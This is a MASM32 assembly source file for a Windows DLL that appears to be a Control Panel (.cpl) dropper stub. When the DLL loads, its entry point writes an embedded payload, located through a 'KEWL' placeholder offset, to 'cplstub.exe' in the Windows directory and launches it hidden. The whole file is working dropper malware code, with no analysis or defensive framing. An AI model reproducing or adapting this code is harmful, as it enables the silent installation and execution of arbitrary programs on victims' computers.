; -------------------------------------------
; Do not modify:
; There are some dependent offsets in CPL.asm
; -------------------------------------------

; #########################################################################

        .486
        .model flat, stdcall
        option casemap :none   ; case sensitive

; #########################################################################

    .nolist
        include \masm32\include\kernel32.inc
        include \masm32\include\windows.inc
        include \masm32\include\user32.inc
        include \masm32\include\advapi32.inc
        include \masm32\include\shell32.inc

        .list
        includelib \masm32\lib\user32.lib
        includelib \masm32\lib\kernel32.lib
        includelib \masm32\lib\advapi32.lib
        includelib \masm32\lib\shell32.lib

; #########################################################################

.data?
        szWindowsDir    db      1024 dup(?)

.data
        szOutStubName   db      "\cplstub.exe",0
        szTextOpen      db      "open",0

.code

DumpFile proto :DWORD

; DLL entry point
LibMain proc hInstDLL:DWORD, reason:DWORD, unused:DWORD
        .IF     reason == DLL_PROCESS_ATTACH
                nop
                invoke  GetWindowsDirectory, offset szWindowsDir, 1024
                invoke  lstrcat, offset szWindowsDir, offset szOutStubName
                nop
                invoke  DumpFile, offset szWindowsDir
                .IF     eax
                        nop
                        invoke  ShellExecute, 0, offset szTextOpen, offset szWindowsDir, NULL, NULL, SW_HIDE
                .ENDIF
        .ENDIF
        mov     eax, TRUE
        ret
LibMain endp

DumpFile proc uses ebx esi OutFile: DWORD
        LOCAL   hFileOut, dwWritten: DWORD

        xor     ebx, ebx

        nop

        invoke  CreateFile, OutFile, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL
        mov     hFileOut, eax
        inc     eax
        jz      @df_ret

        mov     esi, 'KEWL'
        lodsd
        xchg    eax, edx
        invoke  WriteFile, hFileOut, esi, edx, addr dwWritten, NULL

        invoke  CloseHandle, hFileOut
        inc     ebx

@df_ret:
        mov     eax, ebx
        ret
DumpFile endp

end LibMain
